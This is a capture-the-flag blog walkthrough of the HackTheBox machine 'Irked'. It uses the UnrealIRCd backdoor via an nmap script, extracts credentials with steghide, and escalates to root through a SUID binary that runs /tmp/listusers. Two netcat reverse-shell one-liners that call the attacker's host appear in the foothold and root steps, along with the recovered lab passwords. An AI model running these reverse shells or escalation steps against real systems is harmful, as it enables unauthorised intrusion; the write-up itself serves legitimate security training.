---
layout: post
title: "HackTheBox - Irked"
description: "Walkthrough of Irked box on Hackthebox."
thumb_image: "documentation/irkedthumb.png"
tags: [ hackthebox ]
---

{% include image.html path="documentation/irked.webp"
path-detail="documentation/irked.webp"
alt="HTB Irked" %}

## HTB - Irked

IP - 10.10.10.117

### Overview

This box was an easy level linux box on HTB created by [MrAgent](https://www.hackthebox.eu/home/users/profile/624), it started with finding `unrealircd` running on the box and using a nse script to pop a shell on the box using the backdoor that was in `unrealircd`. After basic enumeration we found a `.backup` which had a password, we use that password in `steghide` to extract the password of user `djmardov` from the image in `/var/www/html/`, We gain the root access by exploiting a SUID binary named `viewuser`.

### Enumeration

Let’s start our enumeration process using [Autorecon](https://github.com/Tib3rius/AutoRecon).

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Irked_Rooted]
└──╼ $sudo /opt/AutoRecon/src/autorecon/autorecon.py -o . 10.10.10.187
{% endhighlight %} 
And here is our full tcp nmap result.
{% highlight bash %}
# Nmap 7.80 scan initiated Sat Sep 26 15:06:24 2020 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /home/fumenoid/Desktop/Fumenoid/Pentest/HTB/Irked/10.10.10.117/scans/_full_tcp_nmap.txt -oX /home/fumenoid/Desktop/Fumenoid/Pentest/HTB/Irked/10.10.10.117/scans/xml/_full_tcp_nmap.xml 10.10.10.117
Increasing send delay for 10.10.10.117 from 0 to 5 due to 134 out of 446 dropped probes since last increase.
adjust_timeouts2: packet supposedly had rtt of -809250 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -809250 microseconds.  Ignoring time.
Nmap scan report for 10.10.10.117
Host is up, received user-set (0.084s latency).
Scanned at 2020-09-26 15:06:32 IST for 1507s
Not shown: 65528 closed ports
Reason: 65528 resets
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| [REDACTED]
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesnt have a title (text/html).
111/tcp   open  rpcbind syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34864/udp6  status
|   100024  1          54838/udp   status
|   100024  1          55873/tcp   status
|_  100024  1          58376/tcp6  status
6697/tcp  open  irc     syn-ack ttl 63 UnrealIRCd
8067/tcp  open  irc     syn-ack ttl 63 UnrealIRCd
55873/tcp open  status  syn-ack ttl 63 1 (RPC #100024)
65534/tcp open  irc     syn-ack ttl 63 UnrealIRCd
|_irc-info: Unable to open connection
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 - 4.11 (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Linux 3.12 (93%), Linux 3.13 (93%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
[REDACTED]
# Nmap done at Sat Sep 26 15:31:39 2020 -- 1 IP address (1 host up) scanned in 1515.54 seconds
{% endhighlight %}

Among the open ports, `6697,8067,55873,65534` related to `irc` and the `webserver` on port `80` seems intresting, I am gonna start with enumerating webserver.

#### Enumerating the web server

{% include image.html path="documentation/irkedwebserver.webp"
path-detail="documentation/irkedwebserver.webp"
alt="HTB Irked" %}

`IRC is almost working!` ..hmm, did some basic enum on webserver like checking for `robots.txt`, directory fuzzing and nikto scan but wasn’t able to find anything useful, time to jump to `IRC`.

#### Foothold

A simple google search for `Unrealircd exploits` lead me to this [nmap script](https://nmap.org/nsedoc/scripts/irc-unrealircd-backdoor.html) which can be used to find a backdoor which was in Unrealircd and can also be used to execute commands. Starting a netcat listener using `rlwrap nc -lvnp 9889` and running the nmap script to get a shell using netcat.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Irked]
└──╼ $nmap -d -p 6697,8067,55873,65534 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='nc 10.10.14.8 9889 -e /bin/bash' 10.10.10.117
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-27 01:46 IST
[Redacted]
Scanned at 2020-09-27 01:46:26 IST for 29s

PORT      STATE  SERVICE    REASON
6697/tcp  open   ircs-u     syn-ack
8067/tcp  open   infi-async syn-ack
|_irc-unrealircd-backdoor: Server closed connection, possibly due to too many reconnects. Try again with argument irc-unrealircd-backdoor.wait set to 100 (or higher if you get this message again).
55873/tcp closed unknown    conn-refused
65534/tcp open   unknown    syn-ack
Final times for host: srtt: 82506 rttvar: 27284  to: 191642

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 1) scan.
Initiating NSE at 01:46
Completed NSE at 01:46, 0.00s elapsed
Nmap done: 1 IP address (1 host up) scanned in 29.35 seconds
{% endhighlight %} 

It detected a backdoor, checking the netcat listner.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Irked]
└──╼ $rlwrap nc -lvnp 9889
listening on [any] 9889 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.117] 39502
whoami
ircd
id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
{% endhighlight %} 

And we got a shell on the server.

### Getting User

During basic enumeration we get a file `.backup` in user `djmardov` Documents directory.
{% highlight bash %}
ircd@irked:/home/djmardov/Documents$ ls -la
ls -la
total 16
drwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 .
drwxr-xr-x 18 djmardov djmardov 4096 Nov  3  2018 ..
-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
-rw-------  1 djmardov djmardov   33 May 15  2018 user.txt
ircd@irked:/home/djmardov/Documents$ cat .backup
cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
ircd@irked:/home/djmardov/Documents$
{% endhighlight %} 

`Super elite steg backup pw`, seems like a password for steghide. After some more enumeration I figured it will be the image on webserver as there wasn’t any image in user `djmardov` home directory.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Irked]
└──╼ $wget 10.10.10.117/irked.jpg
--2020-09-27 00:59:16--  http://10.10.10.117/irked.jpg
Connecting to 10.10.10.117:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 34697 (34K) [image/jpeg]
Saving to: ‘irked.jpg’

irked.jpg        100%[========>]  33.88K  --.-KB/s    in 0.1s    

2020-09-27 00:59:16 (320 KB/s) - ‘irked.jpg’ saved [34697/34697]

┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Irked]
└──╼ $steghide extract -sf irked.jpg 
Enter passphrase: 
wrote extracted data to "pass.txt".
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Irked]
└──╼ $cat pass.txt 
Kab6h+m+bbp2J:HG
{% endhighlight %} 

We got the creds of user `djmardov` and now we can ssh into the server using these creds. 

`djmardov:Kab6h+m+bbp2J:HG`

### Rooting the box

Checking `SUID` binaries, and `viewuser` looks intresting.

{% highlight bash %}
djmardov@irked:~$ find / -type f -perm -4000 2>/dev/null
find / -type f -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/sbin/exim4
/usr/sbin/pppd
/usr/bin/chsh
/usr/bin/procmail
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/pkexec
/usr/bin/X
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/viewuser
/sbin/mount.nfs
/bin/su
/bin/mount
/bin/fusermount
/bin/ntfs-3g
/bin/umount
{% endhighlight %} 

Running the `viewuser` binary and it errored out D:

{% highlight bash %}
djmardov@irked:~$ viewuser
viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2020-09-26 16:15 (:0)
sh: 1: /tmp/listusers: not found
{% endhighlight %} 

Creating the file `/tmp/listusers` myself and re-running the binary.

{% highlight bash %}
djmardov@irked:~$ echo "test" > /tmp/listusers
echo "test" > /tmp/listusers
djmardov@irked:~$ viewuser
viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2020-09-26 16:15 (:0)
sh: 1: /tmp/listusers: Permission denied
{% endhighlight %} 

`Permission denied`, maybe `/tmp/listusers` file a executable.

{% highlight bash %}
djmardov@irked:~$ chmod +x /tmp/listusers
chmod +x /tmp/listusers
djmardov@irked:~$ viewuser
viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2020-09-26 16:15 (:0)
{% endhighlight %} 

Yes worked, let’s try command execution using those escalated priv.

{% highlight bash %}
djmardov@irked:~$ echo "id" > /tmp/listusers
echo "id" > /tmp/listusers
djmardov@irked:~$ viewuser
viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2020-09-26 16:15 (:0)
uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
{% endhighlight %} 

Let’s use this SUID binary to get a shell with `uid=0`.

{% highlight bash %}
djmardov@irked:~$ echo "nc 10.10.14.8 9001 -e /bin/bash" > /tmp/listusers
echo "nc 10.10.14.8 9001 -e /bin/bash" > /tmp/listusers
djmardov@irked:~$ viewuser
viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2020-09-26 16:15 (:0)
{% endhighlight %} 

Looking at our rev shell, and yes we got a connection.

{% highlight bash %}
┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Irked]
└──╼ $rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.117] 58647
id
uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
cd /root
wc -c root.txt
33 root.txt
{% endhighlight %} 

###### Hope you learned something new, if you face any issues / have any query, feel free to contact me on social media.
